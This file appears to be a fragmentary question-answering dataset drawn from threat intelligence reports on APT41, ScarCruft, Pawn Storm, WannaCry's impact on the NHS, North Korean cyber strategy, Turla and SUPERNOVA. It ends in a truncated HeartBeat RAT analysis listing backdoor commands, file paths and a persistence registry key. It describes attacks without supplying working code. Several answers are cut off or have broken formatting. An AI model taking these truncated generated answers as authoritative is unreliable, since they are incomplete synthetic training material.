was:\n4e:eb:08:05:55:f1:ab:f7:09:bb:a9:ca:e3:2f:13:cd\nAPT41 has blatantly engaged in financially motivated activity targeting the video game industry, including manipulating virtual currencies. These activities demonstrate established connections to underground marketplaces and familiarity with monetization and laundering techniques.\n\u2022 Using its access to a game production environment, in less than three hours the group generated tens of millions of dollars of a popular game's virtual currency. The money was credited to more than 1,000 accounts and most likely sold and laundered in underground markets.\n\u2022 APT41 has targeted payment services specializing in handling in-game transactions and real money transfer (RMT) purchases.\n\u2022 In a highly unusual case, APT41 attempted to extort a game company by deploying the Encryptor RaaS\nransomware. We suggest that APT41 sought to target in-game currency but found they could not monetize the specific targeted game, so the group resorted to ransomware to attempt to salvage their efforts and profit from the compromise.\n\u2013 This ransomware was sold via a Ransomware-as-a-Service (RaaS) operation that was available via a Tor (.onion) website. Users of the ransomware were charged a 20 percent fee for any collected ransom.\n\u2013 Since this was not the group's typical method of choice for collecting money from a victim environment, it is possible that APT41 turned to a pay-for-service ransomware to avoid having to develop such a tool or set up the associated payment and infrastructure associated with collecting the ransom.\n\u2013 APT41 attempted to deploy the ransomware through a group policy (GPO) scheduled task. However, the malware was unsuccessfully deployed because of a simple typo.\n\u2013 Figure 7 shows the ransom note associated with Encryptor RaaS, which contains default messages in both English and German (the instruction links have been redacted). Given that this is the default message, the languages in the note should not be considered when determining actor origin or location.\nATTENTION!\nThe files on your computer have been securely encrypted.

To date, we have observed more than two dozen victims for these attacks.\nAlthough the exact attack vector remains unknown, the targets appear to receive a malicious link which points to a hacked website where the exploitation kit is hosted. The hacked web server hosting the exploit kit is associated with the ScarCruft APT and used in another line of attacks. Certain details, such as using the same infrastructure and targeting, make us believe that Operation Daybreak is being done by the ScarCruft APT group.\nThe ScarCruft APT group is a relatively new player and managed to stay under the radar for some time. In general, their work is very professional and focused. Their tools and techniques are well above the average. Prior to the discovery of Operation Daybreak, we observed the ScarCruft APT launching a series of attacks in Operation Erebus. Operation Erebus leverages another Flash Player exploit (CVE-2016-4117) through the use of watering hole attacks.\nIn the case of Operation Daybreak, the hacked website hosting the exploit kit performs a couple of browser checks before redirecting the visitor to a server controlled by the attackers hosted in Poland.\nThe main exploit page script contains a BASE64 decoder, as well as rc4 decryption implemented in JS.\nThe parameters sent to the \"ap.php\" script are randomly generated on each hit, so the second stage payload gets encrypted differently each time. This prevents easy detection by MD5 or signatures of the second stage payload.\nThe exploitation process consists of three Flash objects. The Flash object that triggers the vulnerability in Adobe Flash Player is located in second SWF delivered to the victim.\nAt the end of the exploitation chain, the server sends a legitimate PDF file to user \u2013 \"china.pdf\". The \"china.pdf\" file shown to the victims in the last stage of the attack seems to be written in Korean:\n\nWhy did the ScarCruft APT group implement a BASE64 decoder and RC4 decryption in JavaScript within the main exploit page script during Operation Daybreak?

    "output": "The ScarCruft APT group implemented a BASE64 decoder and RC4 decryption in JavaScript within the main exploit page script to obfuscate and encrypt the second stage payload.

The method, which we first discussed in 2014, involves changing a browser tab to point to a phishing site after distracting the target.\nWe can often closely relate current and old Pawn Storm campaigns using data that spans more than four years, possibly because the actors in the group follow a script when setting up an attack. This makes sense, as the sheer volume of their attacks requires careful administration, planning, and organization to succeed. The screenshots below show two typical credential phishing emails that targeted specific organizations in October and November 2017. One type of email is supposedly a message from the target's Microsoft Exchange server about an expired password. The other says there is a new file on the company's OneDrive system.\nWhile these emails might not seem to be advanced in nature, we've seen that credential loss is often the starting point of further attacks that include stealing sensitive data from email inboxes. We have worked with one of the targets, an NGO in the Netherlands targeted twice, in late October and early November 2017. We successfully prevented both attacks from causing any harm. In one case we were able to warn the target within two hours after a dedicated credential phishing site was set up. In an earlier attack, we were able to warn the organization 24 hours before the actual phishing emails were sent.\n\nQ: How does Pawn Storm leverage credential phishing emails to initiate further attacks? What are the potential consequences of successful credential theft in these campaigns?",
    "output": "A: Pawn Storm leverages credential phishing emails to trick targets into revealing their login credentials. These emails often appear to come from legitimate sources, such as a target's Microsoft Exchange server or OneDrive system, claiming issues like expired passwords or new files available. While these emails might not seem advanced, they are effective in initiating further attacks. Successful credential theft can lead to the compromise of sensitive data from email inboxes, which can be used for additional attacks or data exfiltration. For instance, in the case of an NGO in the Netherlands targeted by Pawn Storm, credential phishing was the starting point for potential further intrusions, highlighting the significant risks associated with successful credential theft.",

    "instruction": "Context: Small Headline: The scale of the attack\n1.2 NHS Digital told us that the ransomware spread via the internet, including through the N3 network. As shown in Figure 1 (page 7), the WannaCry ransomware attack affected at least 81 out of 236 trusts across England. These numbers are based on NHS organisations' own reports to NHS England. Of these 81 trusts, there were:\n\u2022 37 trusts infected and locked out of devices (of which, 27 were acute trusts); and\n\u2022 44 trusts not infected but reporting disruption.\nNHS England and NHS Digital identified a further 21 trusts that were attempting to contact the WannaCry domain, but were not locked out of their devices. There are two possible reasons for this. Trusts may have become infected after the kill-switch had been activated, and were therefore not locked out of their devices.1 Alternatively, they may have contacted the WannaCry domain as part of their cyber-security activity.\n1.3 The trusts infected by the WannaCry ransomware experienced two main types of disruption including:\n\u2022 NHS staff being locked out of devices, which prevented or delayed staff accessing and updating patient information, sending test results to patients' GPs and transferring or discharging patients from hospital; and\n\u2022 medical equipment and devices being locked, or isolated from trusts' IT systems to prevent them being locked. This meant trusts' radiology and pathology departments were disrupted as the trusts relied on the equipment and devices for diagnostic imaging (such as MRI scanners) and for testing blood and tissue samples.\n1 A 'kill-switch' is a mechanism that is incorporated into software to shut down that software, or the device on which it sits, in an emergency situation in which it cannot be shut down in the usual manner.\n2\nFigure\nSmall Headline: NHS England emergency response to WannaCry lasted one week\nFriday 12 May\nLate morning \u2013 First trusts begin to report problems\n1:06 pm \u2013 First notification to NHS England's Emergency Preparedness, Resilience and Response team of the attack 4:00 pm \u2013 NHS England declares the cyber attack a national major incident\n45 pm 6:\u2013 Decision that NHS England would lead the response, co-ordinating with key partners, particularly NHS DigitalEvening \u2013 Cyber expert discovers 'kill-switch' and stops malware spreading further\nSmall Headline: Friday 12 May \u2013 Sunday 14 May\nSaturday 13 May \u2013 Monday 15 May \u2013 Second phase of NHS England's response: Ensure that primary care services were stable\nFriday 12 May\nFront-line staff in organisations were calling up either NHS England or NHS Digital as well as the policeSocial media was also reporting the cyber attackInitially unclear as to who was taking the lead. The Department of Health leads on cyber issues, but once it was clear it was a major operational incident NHS England took the lead\nSource: National Audit Offi ce\nAs at 19 May 2017, NHS England had identified 1,220 pieces of diagnostic equipment that had been infected, 1% of all such NHS equipment. Although a relatively small proportion of devices, the figure does not include devices disconnected from IT systems to prevent infection. The trusts we spoke to told us about the disruption they had experienced due to diagnostic equipment being infected or isolated, such as not being able to send MRI scan results to clinicians treating patients in other parts of the hospital.\n1.4 The disruption at trusts not infected by the ransomware was caused by:\n\u2022 the absence of timely central direction, leading to the trusts taking actions on their own initiative to avoid becoming infected, including shutting down devices or isolating devices from their networks to protect themselves from the ransomware; or\n\u2022 trusts not being able to access electronic patient records or receive information, such as test results, because they shared data or systems with an infected trust which had shut down its systems; or\n\u2022 trusts disconnecting from the N3 network, the broadband network connecting all NHS sites in England.\n1.5 The disruption at these trusts took a number of forms. For example, some trusts had to use manual workarounds to perform their usual tasks, such as providing medication to patients, and record information using pen and paper. In addition, organisations could not receive external emails, so communication with national bodies and others outside their trust was severely limited.\n1.6 Despite widespread local disruption, NHS Digital told us that national NHS IT systems managed by NHS Digital were not infected, such as the NHS Spine (a service holding secure databases of demographic and clinical information) and NHSmail (the NHS email system).\n1.7 Of the 27 acute trusts infected and locked out of devices, five had to divert emergency ambulance services to other hospitals. The five trusts and hospitals were:\n\u2022 Barts Health NHS Trust (Royal London Hospital);\n\u2022 Mid Essex Hospital Services NHS Trust (Broomfield Hospital);\n\u2022 East and North Hertfordshire NHS Trust (Lister Hospital);\n\u2022 Hampshire Hospitals NHS Foundation Trust (Basingstoke Hospital); and\n\u2022 North Cumbria University Hospitals NHS Trust (West Cumberland Hospital).\nSmall Headline: The impact on patients\n1.8 As infected NHS organisations could not access important information and electronic systems, including patient records, they had to cancel appointments and operations and some trusts had to divert patients to other accident and emergency departments. Between 12 May and 18 May, NHS England collected some information on how many appointments had been cancelled to help it manage the incident, but did not collect data on all types of appointment. NHS England identified that the NHS had cancelled 6,912 appointments, but this figure does not include repeat outpatient appointments and cancellations identified after 18 May. NHS England estimated the total number of cancelled appointments as being around 19,494, based on the normal rate of follow-up appointments to first appointments, but told us it does not plan to identify the actual number because it is focusing its efforts on responding appropriately to the lessons learned from WannaCry. NHS England did not collect data on how many GP appointments were cancelled or how many ambulances and patients were diverted from the accident and emergency departments that were unable to treat patients.\n1.9 NHS organisations did not report any cases of harm to patients or of data being compromised or stolen. If the WannaCry ransomware attack had led to any patient harm or loss of data then NHS England told us that it would expect trusts to report cases through existing reporting channels, such as reporting data loss direct to the Information Commissioner's Office (ICO) in line with existing policy and guidance on information governance. NHS Digital also told us that analysis of the WannaCry ransomware suggested that the cyber attack was not aimed at accessing or stealing data, although it does not know for certain that this is the case.\n1.10 The NHS continued to provide emergency care from 12 May to 19 May, although some patients had to travel further as five hospitals had diverted services (paragraph 1.7). Patients with planned appointments experienced most disruption. Cancer charities, including Macmillan Cancer Support and Cancer Research UK, reported cancellations causing distress to patients. NHS England's own review identified at least 139 patients who had an urgent referral for potential cancer cancelled, as at 18 May, although the actual number may be higher if trusts misreported during the data collection or identified cancellations after 18 May.\nSmall Headline: The financial impact\n1.11 The Department of Health (the Department), NHS England and the National Crime Agency have told us that no NHS organisations paid the ransom. NHS Digital told us it advised against the payment of the WannaCry ransom during site visits and telephone conferences with infected trusts. Furthermore, NHS England and NHS Digital wrote to all trusts on 14 May advising them against the payment of ransoms, but these emails did not always reach trusts after that attack had begun.\n1.12 The NHS has not calculated the total cost of cancelled appointments; of NHS staff overtime; of additional IT support provided by NHS local bodies or IT consultants; or the cost of restoring data and systems affected by the attack. For example, trusts and other NHS organisations had to roll back systems and restore data and systems, including re-entering data recorded manually while trusts' systems were down. National and local NHS staff had to work overtime, including over the weekend of 13\u201314 May, to resolve problems and to prevent a fresh wave of organisations being affected by WannaCry on Monday 15 May.\nAnswer this question: How did the WannaCry ransomware spread within the NHS network, and what were the two main types of disruption experienced by the infected trusts?",
    "output": "The WannaCry ransomware spread via the internet, including through the N3 network.

However, based on cultural and technical observations, we may deduce that North Korea's cyber doctrine follows the tenets of juche nationalism and the songun doctrine.\nAlthough North Korea's limited online presence makes a thorough analysis of their cyber warfare capabilities a difficult task, it must be noted that what is known of those capabilities closely mirrors their kinetic warfare tactics. Cyber warfare is simply the modern chapter in North Korea's long history of asymmetrical warfare. North Korea has used various unconventional tactics in the\npast, such as guerilla warfare, strategic use of terrain, and psychological operations.146 The regime also aspires to create viable nuclear weapons. 147 Asymmetrical warfare is defined as \"a conflict in which the resources of two belligerents differ in essence and in the struggle, interact and attempt to exploit each other's characteristic weaknesses. Such struggles often involve strategies and tactics of unconventional warfare, the 'weaker' combatants attempting to use strategy to offset deficiencies in quantity or quality\". 148\nAccording to the aforementioned report to the House Armed Service Committee, \"Cyber warfare is an important asymmetric dimension of conflict that North Korea will probably continue to emphasize \u2014 in part because of its deniability and low relative costs.\"149 North Korea's poor economic state150 , further explains the regime's reliance on these tactics. In 2014, the regime reportedly spent 16% of its budget on defense.151 The North Korean military places a strong emphasis on information warfare capabilities including political and psychological warfare152 and cyber or hacker warfare.153\nThe report by Capt. Duk-Ki Kim, Ph.D. highlighted North Korea's counter-asymmetric strategy and ranked each based on intensity and frequency:\nSmall Headline: Cyber warfare operations\nJust ten years ago, experts noted that North Korea was one of the \"least network-ready and most isolated societies on the planet.\"155 Today North Korea's air-gapped networks and prioritization of resources for military use provide both a secure and structured base of operations for cyber operations and a secure means of communications.156 North Korea's hermit infrastructure creates\na cyber-terrain that deters reconnaissance. Because North Korea has few Internet connections to the outside world, anyone seeking intelligence on North Korea's networks has to expend more resources for cyber reconnaissance.157 A 2003 article by the U.S. Office of the National Counterintelligence Executive assessed that \"Development of the nation, rather than empowerment of the individual, appears to be driving DPRK efforts to develop domestic IT infrastructure and industry.\"158 In November 2013, Kim Jong Un referred to cyber warfare capabilities as a \"magic weapon\" in conjunction with nuclear weapons and missiles.159\n146 http://www.history.army.mil/brochures/kw-balance/balance.htm\n147 http://www.bbc.com/news/world-asia-pacific-11813699\n148 http://www.princeton.edu/~achaney/tmve/wiki100k/docs/Asymmetric_warfare.html\n149 http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf\n150 http://www.foreignpolicy.com/articles/2013/04/29/7_things_north_korea_is_really_good_at\n151 http://blogs.wsj.com/korearealtime/2014/04/10/north-korea-details-budget-plans/\n152 https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg\n153 http://www.giac.org/paper/gsec/1870/information-warfare/103284\n154 https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg\n155 http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH4.pdf\n156 http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf\nAccording to Kim Heung-kwang, a North Korean defector and former computer science professor, the regime has the following motivations for expanding its cyber warfare capabilities:160\n\uf0b7 Cyber capabilities are a cost-effective way to offset North Korea's lack of kinetic military prowess.\n\uf0b7 North Korea's school systems place a strong emphasis on math, giving the nation confidence in its programmers, cryptographers, and security researchers.\n\uf0b7 In the modern warfare landscape, cyber capabilities are potentially more utilitarian than heavy artillery or aircraft.\n\uf0b7 Cyber warfare capabilities provide a platform for espionage, psychological operations, and other forms of non-kinetic warfare.\n\uf0b7 Considering the separatist nature of North Korea's infrastructure, cyber warfare provides a strategic advantage since outbound attacks are possible, but inbound attacks would have limited reach.\n\uf0b7 Cyber warfare allows North Korea to leverage the Internet's inherent flaws for offensive purposes while maintaining its defenses, primarily via air-gapping its most critical networks from the outside world.\nNorth Korea's attack and defense capabilities reportedly include the following cyber warfare and electronic warfare components: offensive cyber operations (OCO); computer network operations (CNO), which includes both computer network attack (CNA) and computer network exploitation (CNE); distributed denial of service (DDoS);161 satellite monitoring; drones; GPS jamming capabilities162; and deployment of electromagnetic pulse (EMP).163 North Korea's OCO and CNO capabilities became apparent as early as 2004, when North Korea reportedly gained access to 33 of 80 South Korean military wireless communication networks. In June 2006, an attack on the U.S. State Department originating in the East Asia-Pacific region coincided with U.S.-North Korea negotiations over the regime's nuclear missile testing.164 A month later, a South Korean military report implicated North Korea's Unit 121 in hacking the South Korean and U.S. Defense Departments. North Korea also tested a logic bomb in October 2007. A logic bomb is malicious\ncode programmed to execute based on a pre-defined triggering event. Following the logic bomb test, the UN passed a resolution banning sales of certain computer hardware to North Korea.165\n157 http://www.huffingtonpost.com/2011/07/25/digital-revolution-north-korea_n_908368.html\n158 http://www.ncix.gov/publications/archives/docs/NORTH_KOREA_AND_FOREIGN_IT.pdf\n159 http://english.chosun.com/site/data/html_dir/2013/11/05/2013110501790.html\n160 http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html\n161 (<http://www.google.com/url?q=http%3A%2F%2Fwww.defense.gov%2Fpubs%2FReporttoCongressonMilitaryandSecurityDevelopmentsInvolvingtheDPRK.pdf&sa=D&sntz=1&usg=AFrqEzfhmQPPTuRKlcewmT2M5Oj7Xmg93Q>)http://www.defense.gov/pubs/ReporttoCongressonMilitaryandSecurityDevelopmentsInvolvingtheDPRK.pdf\n162https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg\n163 (<http://www.google.com/url?q=http%3A%2F%2Fwww.theregister.co.uk%2F2014%2F04%2F22%2Fnorks_drones_made_in_china%2F&sa=D&sntz=1&usg=AFrqEzfTItR6h7J68LY80JmBby_k12RQdw>)http://www.theregister.co.uk/2014/04/22/norks_drones_made_in_china/\n164 http://www.informationweek.com/state-department-releases-details-of-computer-system-attacks/d/d-id/1045112?\nNorth Korea considers its cyber warfare capabilities an important asymmetric asset in the face of its perceived enemies, the U.S. and South Korea. While North Korea does not have an immersive digital culture, both the U.S. and South Korea are heavily dependent upon technological infrastructure for social, economic, and political stability.166 For this reason, a cyber attack that cripples or compromises the reliability of the U.S. or South Korea's technological infrastructure could have a far-reaching impact.\nSmall Headline: Gaming for profit and pwnage\nNorth Korea has reportedly used computer games for both illegal capital gain and orchestrating cyber attacks. In 2011, South Korean police arrested five individuals, including one Chinese national, for allegedly collaborating with North Korean hackers affiliated with the Korea Computer Center to steal money via online games. 167 According to South Korean reports, the culprits used an auto-player to quickly progress in the massively multiplayer online role-playing game (MMORPG) \"Lineage\" and were able to use the game's market to obtain real currency. 168 In 2013, South Korean officials released information stating they had found evidence that North Korea was using games as a medium for infecting machines and launching cyber attacks. North Korea had used game downloads to infect 100,000 South Korean machines for a botnet used to launch a distributed denial of service (DDoS) attack against Incheon Airport.169 This clever tactic sought to leverage a seemingly innocent game as a force multiplier in order to amplify the effects of a DDoS attack on a critical infrastructure target. However, in this case, there was little impact on the target.\nNorth Korea has used computer games for both illegal capital gain and orchestrating cyber attacks.\nAnswer this question: What are the primary motivations behind North Korea's expansion of its cyber warfare capabilities, and how do these motivations reflect the regime's broader military and economic strategies?",

    "instruction": "Answer based on context:\n\nSmall Headline: Trojan.Turla\nIn 2008, a malware incident was reported to have affected the US Central Command Network. The incident was the direct result of an infected removable drive that was connected to a computer on the network, which executed an autorun file launching a malicious DLL file stored on the drive. This was dubbed the and was considered one of the worst breaches of US military computers in history. The malware, which Symantec called  (also known as Agent.BTZ), had the ability to spread through a network, gather sensitive information, and exfiltrate data to a remote command-and-control (C&C) server.\nSince then, multiple links have been established between Trojan.Minit and recent samples of Trojan.Turla. The most infamous link is the use of a shared XOR key across these two families. This key has been used by the attackers to encrypt log data and has also been used in a number of custom tools used by the Waterbug group.\nTrojan.Turla is an extremely persistent, sophisticated malware, professionally developed with extensible capabilities and used exclusively by the Waterbug group. Trojan.Turla is built from a framework that is designed for long-term monitoring of targeted individuals or organizations and has been in operation since at least 2005. Both 32-bit and 64-bit samples have been identified in use in the wild. Analysis has determined that Trojan. Turla is essentially an extensible platform which appears to share common components between variants through the use of a common framework.\nSymantec has identified four unique variants of Trojan.Turla, all of which use shared components. Details on the relationships between the variants are discussed in the following section.\nVery Small Headline: Variants\nFigure 7. Variants of Trojan.Turla identified by Symantec\nSymantec has identified four unique variants of Trojan.Turla which have been in development between 2005 and 2014.\n\u2022 ComRAT is a direct descendant of the Agent.BTZ malware that was in use in 2008. Development of this variant has continued and recent samples, compiled in 2013, have been identified.\n\u2022 The earliest variant of FA (so named because of debug strings linking to project fa64) was compiled in 2005.\nThis variant has seen continuous development from 2009 to 2014.\n\u2022 Carbon is the most unique of all four variants. Carbon is distributed in two forks\u2014a driver-based version (rootkit) and a driver-less version. Early variants of Carbon were identified in 2007, 2008, and 2009. The majority of Carbon's code has received minor incremental updates seen in recent samples identified in 2014. The most closely related variant to Carbon is SAV.\n\u2022 SAV (also known as Uroburos) is a recent variant of Trojan.Turla which has been in development since at least 2011 and has received incremental updates through to 2014.\nAnalysis of these variants shows common code structures, shared components, and a continuous development which has run in parallel since at least 2005.\nVery Small Headline: Carbon and SAV\nWhen Carbon was first developed, the driver-based and driver-less forks used a custom communication module which supported multiple protocols including Transmission Control Protocol (TCP), Named Pipes (NP), and Multipoint-to-Point (M2P). When SAV first appeared in 2011, it was based on the driver-based fork of Carbon. However, injected components were significantly changed or possibly rewritten. Shared features included the communication module. This suggests that SAV is derived from Carbon.\nVery Small Headline: FA, Carbon, and SAV\nIn June 2007, Carbon drivers already included the use of specific error code values which may have originally been implemented as part of the communication channel code. FA Drivers introduced the use of these error code values between August, 2008 and December, 2009 as part of a major refactoring effort.\nAdditionally, FA and SAV also shared a custom packer used exclusively by the Waterbug group. By 2009, FA had begun using the custom packer for user-mode components. Carbon did not use the packer in any of the collected samples, whereas SAV used the packer for multiple components.\nThese relationships indicate that features were developed separately, and later migrated to other projects. This sharing may be due to copying parts of source code (possibly entire folders) between independently developed projects.\nVery Small Headline: Shared features\nThe driver-based column indicates rootkit functionality such as that found in Carbon and SAV. The driver-less column indicates the use of user-mode API hooking. An encrypted file system was also found in two of the variants, Carbon and SAV. This is an NTFS file, encrypted using 128-bit CAST in CBC mode. In other variants, a directory structure was used and encryption was performed using simple byte-by-byte XOR encryption (using the same key used in Agent.BTZ). Code sharing shows trace evidence or remnants of code from earlier versions still present in recent samples. One such example is the use of LCG and associated constant values in the decryption algorithm.\n\nWhat are the key characteristics of Trojan.Turla that make it an effective tool for long-term monitoring by the Waterbug group?",
    "output": "Trojan.Turla is characterized by its extreme persistence, sophistication, and professional development. It is built on a framework designed for long-term monitoring of targeted individuals or organizations, with both 32-bit and 64-bit samples identified in the wild. Its extensible platform shares common components between variants through a common framework, allowing for continuous updates and improvements. These characteristics enable the Waterbug group to maintain prolonged surveillance and data exfiltration without easy detection or disruption.",

For this reference, we see the registration of solartrackingsystem[.]net on October 2, 2018, but do not see a TLS certificate registered. This absence of a TLS certificate does not indicate that there is no certificate, as DomainTools shows a certificate for this domain.

It is undetermined whether this malware is associated with the Solorigate backdoor or represents an additional threat actor. As per the Appendix section on the Microsoft blog:\n\"In an interesting turn of events, the investigation of the whole SolarWinds compromise led to the discovery of an additional malware that also affects the SolarWinds Orion product but has been determined to be likely unrelated to this compromise and used by a different threat actor. The malware consists of a small persistence backdoor in the form of a DLL file named App_Web_logoimagehandler.ashx.b6031896.dll, which is programmed to allow remote code execution through SolarWinds web application server when installed in the folder \"inetpub\\SolarWinds\\bin\\\". Unlike Solorigate, this malicious DLL does not have a digital signature, which suggests that this may be unrelated to the supply chain compromise.\"\nMicrosoft, , and have dubbed this second malware, a .NET webshell, SUPERNOVA. SUPERNOVA is , a malicious Powershell script. Microsoft advises that if SUPERNOVA is detected on SolarWinds installations, it should be treated as a separate infection. While far from conclusive, this additional malware raises the possibility of multiple actors within the same environment. Multiple actors on the same system, knowingly or unknowingly, are not novel. For example, evidence of both APT28 and APT29 were found on Democratic National Committee servers breached in 2016. Additionally, a file leaked from the ShadowBrokers releases showed 45 file signatures that could be used to scan for infection from other actors, some not publicly known at the time. Still, this adds to the argument that we are far from decisive attribution.\n\nQuestion: What is the significance of the discovery of the SUPERNOVA malware in the SolarWinds Orion product, and how does it complicate the attribution process? What implications does this have for network defenders?\n\nAnswer:",
    "output": "The discovery of the SUPERNOVA malware in the SolarWinds Orion product is significant because it suggests the presence of multiple actors within the same environment. SUPERNOVA, a .NET webshell, is distinct from the Solorigate backdoor and lacks a digital signature, indicating it may be unrelated to the supply chain compromise. This complicates the attribution process as it introduces the possibility that different threat actors are operating independently or in conjunction. For network defenders, this implies the need for a multi-faceted approach to incident response and threat hunting, treating each malware instance as a separate infection and considering the potential for overlapping or concurrent attacks by different actors.",

    "instruction": "Big Headline: Summary\nBased on our research and telemetry on the different campaigns where Gazer was used,we believe that Southeastern Europe as well as countries in the former Soviet Union Republichas recently been the main target. The witnessed techniques, tactics and procedures (TTPs) are in-line with what we usuallysee in Turla's operation: a first stage backdoor, such as (<https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender-Whitepaper-PAC-A4-en_EN1.pdf>)Skipper, likely delivered through spearphishingfollowed by the appearance on the compromised system of a second stage backdoor, Gazerin this case.\nAlthough we could not find irrefutable evidence that this backdoor is truly another tool in Turla's arsenal, several clues lead us to believe that this is indeed the case. First, their targets are in line with Turla's traditional targets: Ministries of Foreign Affairs (MFAs) and embassies. Second, the modus operandi of spearphishing, followed by a first stage backdoor and a second stage, stealthier backdoor is what has been seen over and over again. Skipper, which has been linked to Turla in the past, was found alongside Gazer in most cases we investigated. Finally, there are many similarities between Gazer and other second stage backdoors used by the Turla group such as (<https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/>)Carbon and (<https://researchcenter.paloaltonetworks.com/2017/05/unit42-kazuar-multiplatform-espionage-backdoor-api-access/>)Kazuar.\nAs usual, the Turla APT group makes an extra effort to avoid detection by wiping files securely, changing the strings and randomizing what could be simple markers through the different backdoor versions. In the most recent version we have found, Gazer authors modified most of the strings  and inserted \"video-game-related\" sentences throughout the code. An example of such a string is depicted in (<>)Figure 1.\nBig Headline: SImIlarITIeS wITh oTher Turla ToolS\nGazer is written in C++ and shares several similarities with other malware from the Turla APT family. Indeed, Gazer, Carbon and Kazuar can receive encrypted tasks from a C&C server, which can be executed either by the infected machine or by another machine on the network. They all use an encrypted container to store the malware's components and configuration and they also log their actions  in a file.\nThe list of C&C servers is encrypted and embedded in Gazer's PE resources. They are all compromised, legitimate websites (that mostly use the WordPress CMS) that act as a first layer proxy. This is also  a common tactic for the Turla APT group.\nAnother interesting linkage is that one of the C&C servers embedded in a Gazer sample was known  to be used in a JScript backdoor documented by Kaspersky as Kopiluak.\nLast but not least, these three malware families (Gazer, Carbon and Kazuar) have a similar list  of processes that may be employed as a target to inject the module used to communicate with the C&C server embedded in the binary. The resource containing this list can change from one sample  to another, it is likely tailored to what is installed on the system (for example, on some samples, the process name \"safari.exe\" can appear on the list).\nQuestion: How does the Turla APT group typically deploy the Gazer backdoor, and what are the key steps involved in this deployment process?",
    "output": "Answer: The Turla APT group typically deploys the Gazer backdoor through a multi-stage process. Initially, they deliver a first stage backdoor, such as Skipper, likely through spearphishing. Once the first stage backdoor is successfully deployed, the second stage backdoor, Gazer, appears on the compromised system. This two-step approach is characteristic of Turla's modus operandi and helps them maintain stealth and persistence on the target systems.",

This paper will discuss how their specifically crafted campaigns infiltrate their targets.\nCompared to most advanced persistent threat (APT) campaigns with diverse targeted industries, the HeartBeat campaign is an isolated case. Furthermore, we will examine their attack methodologies which include their attack vector, the remote administration tool (RAT) component, and command-and-control servers. Finally, we will discuss how this information can be useful in developing defensive strategies in protecting organizations as well as predicting future targets.\nBig Headline: CAmPAign tArgets\nThe HeartBeat campaign appears to target government organizations and institutions or communities that are in some way related to the South Korean government. Specifically, we were able to identify the following targets:\n\u2022 Political parties\n\u2022 Media outfits\n\u2022 A national policy research institute\n\u2022 A military branch of South Korean armed forces\n\u2022 A small business sector organization\n\u2022 Branches of South Korean government\nThe profile of their targets suggests that the motive behind the campaign may be politically motivated.\nBig Headline: Context\nThe first HeartBeat campaign remote access tool (RAT)5 component was discovered in June 2012 in a Korean newspaper company network. Further investigation revealed that the campaign has been actively distributing their RAT component to their targets in 2011 and the first half of 2012. Furthermore, we uncovered one malware component that dates back to November 2009. This indicates that the campaign started during that time or earlier.\nEarlier versions of the HeartBeat campaign's RAT component contained the following strings in their codes:\nThus, the campaign name \"HeartBeat.\"\n5\nBig Headline: AttACk VeCtor\nIn order to gain control over targets systems, HeartBeat perpetrators install a RAT in prospective victims' systems. This RAT arrives as a disguised or fake document which is actually a bundled file. The bundled file contains both a decoy document and the RAT installer that has been packaged together using a binder tool. Once it runs, the decoy document is displayed to the user while the RAT unknowingly executes in the background.\nIt is unclear how these packaged files specifically arrive on victims' systems, but we highly suspect that spearphishing emails6 containing these packaged malware were primarily used to distribute them. In fact, the packaged malware used the icon of the decoy document in order to look legitimate. For instance, if the decoy is an XLS file, the package will appear to have an XLS document icon. In addition, some of the decoy files required passwords in order to be viewed.\nThe previously mentioned techniques are commonly used in spearphishing attacks where prospective victims are lured to open a seemingly benign document attachment. In order to appear more legitimate, some of these emails contain password protected documents. A password is then provided in the email body as a social engineering technique.\nBased on the samples we collected, the campaign's decoy documents used the file formats .JPG, .PDF, XLS, and HWP, the Korean government standard word processor format. One of the previous HeartBeat attacks even dropped a pornographic .JPG image as decoy. Below is a screenshot of a Hangul Word Processor (.HWP) document used as bait in November 2011. Its document title roughly translates to \"Information to the President.hwp.\"\n6\nMedium Headline: Backdoor Functionalities\nThe HeartBeat campaign's RAT component allows attackers to remotely execute the following commands on affected hosts:\n\u2022 List running processes and their respective process IDs\n\u2022 Download and execute file(s)\n\u2022 Update itself\n\u2022 Uninstall itself\n\u2022 Create or terminate a process\n\u2022 List available removable and fixed drives\n\u2022 List existing files and their creation date/time\n\u2022 Upload file(s)\n\u2022 Delete file(s)\n\u2022 Get the file creation date/time of a specific file\n\u2022 Open a remote command shell access\n\u2022 Reboot the system\nThese commands give the attackers complete control over their victims' systems. Attackers also have the option to uninstall the RAT any time to cover their tracks and avoid being discovered.\nMedium Headline: Installation and Persistence\nThe RAT installer is initially dropped and executed by the packaged file using any of the following file names:\n\u2022 %System%\\msrt.exe\n\u2022 %Program Files%\\Common Files\\AcroRd32.exe\n\u2022 %Program Files%\\Common Files\\config.exe\n\u2022 %Program Files%\\Common Files\\explorer.exe\nThe RAT installer in turn drops a .DLL component which contains the backdoor capabilities. In order to stay hidden, the .DLL uses file names similar to legitimate applications. Below is a list of file names used:\n\u2022 %Program Files%\\Common Files\\Services\\6to4nt.dll\n\u2022 %Program Files%\\Common Files\\System\\6to4nt.dll\n\u2022 %Program Files%\\Windows NT\\Accessories\\6to4nt.dll\n\u2022 %Program Files%\\Windows NT\\htrn.dll\n\u2022 %Program Files%\\Windows NT\\htrn_jls.dll\n\u2022 %Program Files%\\Windows NT\\hyper.dll\n\u2022 %System%\\Network Remote.dll\n\u2022 %System%\\SvcHost.dll\nSome these dropped .DLL files use fake file properties in order to not appear suspicious. The following is an example:\nIn some cases, the RAT installer drops 2 .DLL files where one of the .DLLs serves as a loader of the other .DLL file which contains the backdoor payload.\nThe .DLL component is then registered as a service through the following added registries:\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ Services\\{service name}\nType = 